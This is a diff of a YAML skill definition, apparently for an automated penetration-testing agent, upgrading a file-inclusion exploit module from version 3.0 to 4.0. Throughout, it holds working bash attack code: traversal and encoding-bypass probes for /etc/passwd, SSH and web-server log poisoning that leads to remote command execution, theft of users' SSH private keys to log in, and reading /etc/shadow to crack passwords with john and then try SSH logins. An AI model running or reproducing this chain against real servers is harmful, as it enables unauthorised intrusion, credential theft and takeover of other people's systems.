@@ -1,11 +1,15 @@
 skill_id: lfi_rfi_exploit
 name: "本地/远程文件包含 (LFI/RFI)"
 category: web_rce
-version: "3.0"
+version: "4.0"
 
 principle: |
   文件包含漏洞允许攻击者读取服务器文件或执行代码。
   攻击链: LFI读取敏感文件 → 日志注入(SSH/Apache) → 包含日志文件 → RCE。
+  路径解析策略（v4 三层模型）：
+    1. 绝对路径优先: 先尝试 /etc/passwd（无 ../ 前缀）
+    2. 相对路径回退: 使用 ../ 深度递增（1-10级），确认后记忆深度
+    3. 编码绕过: %00 截断、双编码、路径归一化绕过
   关键: 不同应用目录深度不同，必须遍历 1-10 级 ../ 才能确保命中。
   PHP wrappers 可直接 RCE: php://input + POST、data:// 协议。
   PHP filter 链可读源码: php://filter/convert.base64-encode/resource=
@@ -25,14 +29,15 @@ match:
 
 probes:
   - id: detect_lfi
-    description: "多深度遍历探测 LFI 参数（1-10 级 ../）"
+    description: "三层策略探测 LFI: 绝对路径 → 相对路径深度遍历 → 编码绕过"
     command: |
       BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-      echo "=== LFI Multi-Depth Probe ==="
+      echo "=== LFI Three-Layer Probe (v4) ==="
+
+      COMMON_PARAMS="page file include path doc folder view content template image"
 
       try_lfi() {
         local url="$1"
-        echo "[PROBE] $url"
         local result
         result=$(curl -s "$url" --max-time 6 2>/dev/null)
         if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
@@ -43,19 +48,29 @@ probes:
         return 1
       }
 
+      echo "--- Layer 1: Absolute path (no traversal) ---"
+      for param in $COMMON_PARAMS; do
+        if try_lfi "$BASE/?$param=/etc/passwd"; then
+          echo "LFI_FOUND:$param:0:absolute"
+          exit 0
+        fi
+      done
+
+      echo "--- Layer 2: Relative path depth traversal (1-10) ---"
       for depth in 1 2 3 4 5 6 7 8 9 10; do
         TRAV=$(printf '../%.0s' $(seq 1 $depth))
-        for param in page file include path doc folder view content template image; do
+        for param in $COMMON_PARAMS; do
           if try_lfi "$BASE/?$param=${TRAV}etc/passwd"; then
-            echo "LFI_FOUND:$param:$depth"
+            echo "LFI_FOUND:$param:$depth:relative"
             exit 0
           fi
         done
       done
 
+      echo "--- Layer 2b: Known application paths from recon ---"
       for depth in 1 2 3 4 5 6 7 8 9 10; do
         TRAV=$(printf '../%.0s' $(seq 1 $depth))
-        for kpath in "/antibot_image/antibots/info.php?image=" "/index.php?page=" "/include.php?file=" "/view.php?file=" "/display.php?path="; do
+        for kpath in "/index.php?page=" "/include.php?file=" "/view.php?file=" "/display.php?path="; do
           if try_lfi "$BASE${kpath}${TRAV}etc/passwd"; then
             echo "LFI_PATH_FOUND:$kpath:$depth"
             exit 0
@@ -63,7 +78,8 @@ probes:
         done
       done
 
-      for depth in 1 2 3 4 5 6 7 8 9 10; do
+      echo "--- Layer 3: Encoding bypass ---"
+      for depth in 1 3 5 7; do
         TRAV=$(printf '../%.0s' $(seq 1 $depth))
         for param in page file include path image; do
           for bypass in "%00" "....//....//....//etc/passwd" "..%252f"; do
@@ -78,12 +94,14 @@ probes:
       echo "LFI_NOT_FOUND"
     timeout: 120
     parse_rules:
-      - if_regex: "LFI_FOUND:(\\w+):(\\d+)"
-        set: { lfi_confirmed: true, lfi_type: "param", lfi_param: "$1", lfi_depth: "$2" }
+      - if_regex: "LFI_FOUND:(\\w+):(\\d+):absolute"
+        set: { lfi_confirmed: true, lfi_type: "absolute", lfi_param: "$1", lfi_depth: "0", lfi_style: "absolute" }
+      - if_regex: "LFI_FOUND:(\\w+):(\\d+):relative"
+        set: { lfi_confirmed: true, lfi_type: "param", lfi_param: "$1", lfi_depth: "$2", lfi_style: "relative" }
       - if_regex: "LFI_PATH_FOUND:(.+?):(\\d+)"
-        set: { lfi_confirmed: true, lfi_type: "path", lfi_path: "$1", lfi_depth: "$2" }
+        set: { lfi_confirmed: true, lfi_type: "path", lfi_path: "$1", lfi_depth: "$2", lfi_style: "relative" }
       - if_regex: "LFI_BYPASS_FOUND:(\\w+):(\\d+):(.+)"
-        set: { lfi_confirmed: true, lfi_type: "bypass", lfi_param: "$1", lfi_depth: "$2", lfi_bypass: "$3" }
+        set: { lfi_confirmed: true, lfi_type: "bypass", lfi_param: "$1", lfi_depth: "$2", lfi_bypass: "$3", lfi_style: "bypass" }
 
   - id: enumerate_files
     description: "利用已确认的 LFI 读取高价值文件（密码、日志、密钥、配置）"
@@ -95,19 +113,29 @@ probes:
       LFI_PARAM="{lfi_param}"
       LFI_DEPTH="{lfi_depth}"
       LFI_PATH="{lfi_path}"
+      LFI_STYLE="{lfi_style}"
 
       [ -z "$LFI_PARAM" ] && LFI_PARAM="page"
       [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
       [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM="page"
+      [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
 
       build_url() {
         local target_file="$1"
-        local TRAV
-        TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
-        if [ -n "$LFI_PATH" ] && [ "$LFI_PATH" != "{lfi_path}" ]; then
-          echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+        if [ "$LFI_STYLE" = "absolute" ]; then
+          if [ -n "$LFI_PATH" ] && [ "$LFI_PATH" != "{lfi_path}" ]; then
+            echo "$BASE${LFI_PATH}/${target_file}"
+          else
+            echo "$BASE/?$LFI_PARAM=/${target_file}"
+          fi
         else
-          echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+          local TRAV
+          TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+          if [ -n "$LFI_PATH" ] && [ "$LFI_PATH" != "{lfi_path}" ]; then
+            echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+          else
+            echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+          fi
         fi
       }
 
@@ -135,7 +163,8 @@ probes:
 
       READABLE=""
       for f in $TARGETS; do
-        url=$(build_url "$f")
+        clean_f=$(echo "$f" | sed 's|^/||')
+        url=$(build_url "$clean_f")
         echo "[READ] $url"
         result=$(curl -s "$url" --max-time 6 2>/dev/null)
         size=${#result}
@@ -291,7 +320,6 @@ exploit_paths:
             "$PAYLOAD"@{TARGET_IP} 2>&1 || true)
           echo "$SSH_ERR" | head -3
 
-          # OpenSSH 新版会拦截含特殊字符用户名，自动回退到 SSH banner 投毒
           if echo "$SSH_ERR" | grep -qi "invalid characters"; then
             echo "[INFO] OpenSSH rejected username payload, fallback to SSH banner poisoning"
             if command -v nc >/dev/null 2>&1; then
@@ -306,14 +334,42 @@ exploit_paths:
 
           CONFIRMED_PARAM="{lfi_param}"
           CONFIRMED_DEPTH="{lfi_depth}"
+          LFI_STYLE="{lfi_style}"
           [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
           [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
 
           if [ -n "$CONFIRMED_PARAM" ]; then
             PARAMS="$CONFIRMED_PARAM page file include path image content template"
           else
             PARAMS="page file include path image content template"
           fi
+
+          for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
+            if [ "$LFI_STYLE" = "absolute" ] && [ -n "$CONFIRMED_PARAM" ]; then
+              URL="$BASE/?$CONFIRMED_PARAM=/$logpath&cmd=id"
+              echo "[PROBE-ABS] $URL"
+              result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+              if echo "$result" | grep -qE 'uid=[0-9]+'; then
+                echo "[HIT] SSH_LOG_POISON_RCE:$CONFIRMED_PARAM:0:$logpath"
+                echo "$result" | grep "uid="
+                exit 0
+              fi
+            fi
+            if [ -n "$CONFIRMED_DEPTH" ] && [ "$CONFIRMED_DEPTH" != "0" ]; then
+              TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+              for param in $PARAMS; do
+                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                echo "[PROBE] $URL"
+                result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+                if echo "$result" | grep -qE 'uid=[0-9]+'; then
+                  echo "[HIT] SSH_LOG_POISON_RCE:$param:$CONFIRMED_DEPTH:$logpath"
+                  echo "$result" | grep "uid="
+                  exit 0
+                fi
+              done
+            fi
+          done
 
           for depth in 1 2 3 4 5 6 7 8 9 10; do
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
@@ -348,7 +404,11 @@ exploit_paths:
           sleep 1
 
           CONFIRMED_PARAM="{lfi_param}"
+          CONFIRMED_DEPTH="{lfi_depth}"
+          LFI_STYLE="{lfi_style}"
           [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+          [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
           if [ -n "$CONFIRMED_PARAM" ]; then
             PARAMS="$CONFIRMED_PARAM page file include path image content template"
           else
@@ -356,6 +416,36 @@ exploit_paths:
           fi
 
           LOGS="var/log/apache2/access.log var/log/apache2/error.log var/log/nginx/access.log var/log/nginx/error.log var/log/httpd/access_log var/log/httpd/error_log"
+
+          for logpath in $LOGS; do
+            if [ "$LFI_STYLE" = "absolute" ] && [ -n "$CONFIRMED_PARAM" ]; then
+              URL="$BASE/?$CONFIRMED_PARAM=/$logpath&cmd=id"
+              echo "[PROBE-ABS] $URL"
+              result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+              if echo "$result" | grep -qE 'uid=[0-9]+'; then
+                echo "[HIT] APACHE_LOG_POISON_RCE:$CONFIRMED_PARAM:0:$logpath"
+                echo "$result" | grep "uid="
+                exit 0
+              fi
+            fi
+          done
+
+          if [ -n "$CONFIRMED_DEPTH" ] && [ "$CONFIRMED_DEPTH" != "0" ]; then
+            TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+            for logpath in $LOGS; do
+              for param in $PARAMS; do
+                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                echo "[PROBE] $URL"
+                result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+                if echo "$result" | grep -qE 'uid=[0-9]+'; then
+                  echo "[HIT] APACHE_LOG_POISON_RCE:$param:$CONFIRMED_DEPTH:$logpath"
+                  echo "$result" | grep "uid="
+                  exit 0
+                fi
+              done
+            done
+          fi
+
           for depth in 1 2 3 4 5 6 7 8 9 10; do
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
             for logpath in $LOGS; do
@@ -395,30 +485,38 @@ exploit_paths:
           LFI_PARAM="{lfi_param}"
           LFI_DEPTH="{lfi_depth}"
           LFI_PATH="{lfi_path}"
+          LFI_STYLE="{lfi_style}"
           [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
           [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
           [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
           [ -z "$LFI_PARAM" ] && [ -z "$LFI_PATH" ] && LFI_PARAM="page"
 
           build_url() {
             local target_file="$1"
-            local TRAV
-            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
-            if [ -n "$LFI_PATH" ]; then
-              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            if [ "$LFI_STYLE" = "absolute" ]; then
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}/${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=/${target_file}"
+              fi
             else
-              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              local TRAV
+              TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              fi
             fi
           }
 
-          # 1) Read /etc/passwd to get user list
           passwd_url=$(build_url "etc/passwd")
           PASSWD=$(curl -s "$passwd_url" --max-time 6 2>/dev/null)
           USERS=$(echo "$PASSWD" | grep -E ':/home/|:/root:' | cut -d: -f1 | head -10)
           [ -z "$USERS" ] && USERS="root"
           echo "目标用户: $USERS"
 
-          # 2) Try to fetch SSH keys for each user and login
           for user in $USERS; do
             if [ "$user" = "root" ]; then
               KEY_PATH="root/.ssh/id_rsa"
@@ -433,7 +531,6 @@ exploit_paths:
               KEYFILE=$(mktemp /tmp/stolen_key_XXXX)
               echo "$KEY_CONTENT" > "$KEYFILE"
               chmod 600 "$KEYFILE"
-              # Try SSH login
               result=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                        -o BatchMode=yes -i "$KEYFILE" \
                        "$user@{TARGET_IP}" "id" 2>&1)
@@ -467,23 +564,32 @@ exploit_paths:
           LFI_PARAM="{lfi_param}"
           LFI_DEPTH="{lfi_depth}"
           LFI_PATH="{lfi_path}"
+          LFI_STYLE="{lfi_style}"
           [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
           [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
           [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
           [ -z "$LFI_PARAM" ] && [ -z "$LFI_PATH" ] && LFI_PARAM="page"
 
           build_url() {
             local target_file="$1"
-            local TRAV
-            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
-            if [ -n "$LFI_PATH" ]; then
-              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            if [ "$LFI_STYLE" = "absolute" ]; then
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}/${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=/${target_file}"
+              fi
             else
-              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              local TRAV
+              TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              fi
             fi
           }
 
-          # Fetch /etc/shadow
           shadow_url=$(build_url "etc/shadow")
           echo "[FETCH] $shadow_url"
           SHADOW=$(curl -s "$shadow_url" --max-time 8 2>/dev/null)
@@ -493,7 +599,6 @@ exploit_paths:
           fi
           echo "[HIT] /etc/shadow 可读"
 
-          # Also fetch /etc/passwd for john
           passwd_url=$(build_url "etc/passwd")
           PASSWD_CONTENT=$(curl -s "$passwd_url" --max-time 6 2>/dev/null)
 
@@ -502,7 +607,6 @@ exploit_paths:
           echo "$SHADOW" > "$SHADOW_FILE"
           echo "$PASSWD_CONTENT" > "$PASSWD_FILE"
 
-          # unshadow + john (quick mode, 60s timeout)
           UNSHADOW_FILE=$(mktemp /tmp/unshadow_XXXX)
           unshadow "$PASSWD_FILE" "$SHADOW_FILE" > "$UNSHADOW_FILE" 2>/dev/null || \
             cp "$SHADOW_FILE" "$UNSHADOW_FILE"
@@ -512,7 +616,6 @@ exploit_paths:
             "$UNSHADOW_FILE" 2>/dev/null || true
           john --show "$UNSHADOW_FILE" 2>/dev/null | head -20
 
-          # Extract cracked credentials
           CRACKED=$(john --show "$UNSHADOW_FILE" 2>/dev/null | grep ':' | head -5)
           if [ -z "$CRACKED" ]; then
             echo "SHADOW_CRACK_FAILED: no passwords cracked"
@@ -523,7 +626,6 @@ exploit_paths:
           echo "[HIT] 破解到凭据:"
           echo "$CRACKED"
 
-          # Try SSH login with cracked creds
           echo "$CRACKED" | while IFS=: read -r user pass rest; do
             [ -z "$user" ] || [ -z "$pass" ] && continue
             echo "[SSH] 尝试 $user:$pass ..."
@@ -554,31 +656,42 @@ exploit_paths:
       lfi_confirmed: true
     steps:
       - id: read_passwd_confirm
-        description: "Stage 2: 验证目录遍历 — 使用已确认参数和深度读取 /etc/passwd"
+        description: "验证目录遍历 — 使用已确认参数和深度/风格读取 /etc/passwd"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
 
           LFI_PARAM="{lfi_param}"
           LFI_DEPTH="{lfi_depth}"
           LFI_PATH="{lfi_path}"
+          LFI_STYLE="{lfi_style}"
           [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
           [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH=""
           [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
 
           build_url() {
             local target_file="$1"
-            local TRAV
-            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
-            if [ -n "$LFI_PATH" ]; then
-              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            local d="$2"
+            if [ "$LFI_STYLE" = "absolute" ]; then
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}/${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=/${target_file}"
+              fi
             else
-              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              local TRAV
+              TRAV=$(printf '../%.0s' $(seq 1 $d))
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              fi
             fi
           }
 
           if [ -n "$LFI_DEPTH" ] && { [ -n "$LFI_PATH" ] || [ -n "$LFI_PARAM" ]; }; then
-            URL=$(build_url "etc/passwd")
-            echo "[PROBE] $URL (param=$LFI_PARAM path=$LFI_PATH depth=$LFI_DEPTH)"
+            URL=$(build_url "etc/passwd" "$LFI_DEPTH")
+            echo "[PROBE] $URL (param=$LFI_PARAM path=$LFI_PATH depth=$LFI_DEPTH style=$LFI_STYLE)"
             result=$(curl -s "$URL" --max-time 6 2>/dev/null)
             if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
               echo "[HIT] LFI_PASSWD_OK"
@@ -587,11 +700,21 @@ exploit_paths:
             fi
           fi
 
+          for param in page file include path image content template; do
+            URL="$BASE/?$param=/etc/passwd"
+            echo "[PROBE-ABS] $URL"
+            result=$(curl -s "$URL" --max-time 6 2>/dev/null)
+            if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
+              echo "[HIT] LFI_PASSWD_OK:$param:0:absolute"
+              echo "$result"
+              exit 0
+            fi
+          done
+
           for depth in 1 2 3 4 5 6 7 8 9 10; do
-            LFI_DEPTH="$depth"
             for param in page file include path image content template; do
               LFI_PARAM="$param"
-              URL=$(build_url "etc/passwd")
+              URL=$(build_url "etc/passwd" "$depth")
               echo "[PROBE] $URL"
               result=$(curl -s "$URL" --max-time 6 2>/dev/null)
               if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
@@ -611,7 +734,7 @@ exploit_paths:
           shell_type: "file_read"
 
       - id: read_high_value_files
-        description: "Stage 3: 深度探测 — 批量读取敏感文件（shadow/SSH密钥/日志/配置）+ 枚举用户文件"
+        description: "深度探测 — 批量读取敏感文件（shadow/SSH密钥/日志/配置）+ 枚举用户文件"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "=== LFI Sensitive File Deep Enumeration ==="
@@ -619,19 +742,29 @@ exploit_paths:
           LFI_PARAM="{lfi_param}"
           LFI_DEPTH="{lfi_depth}"
           LFI_PATH="{lfi_path}"
+          LFI_STYLE="{lfi_style}"
           [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
           [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
           [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
           [ -z "$LFI_PARAM" ] && [ -z "$LFI_PATH" ] && LFI_PARAM="page"
 
           build_url() {
             local target_file="$1"
-            local TRAV
-            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
-            if [ -n "$LFI_PATH" ]; then
-              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            if [ "$LFI_STYLE" = "absolute" ]; then
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}/${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=/${target_file}"
+              fi
             else
-              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              local TRAV
+              TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+              if [ -n "$LFI_PATH" ]; then
+                echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+              else
+                echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              fi
             fi
           }
 
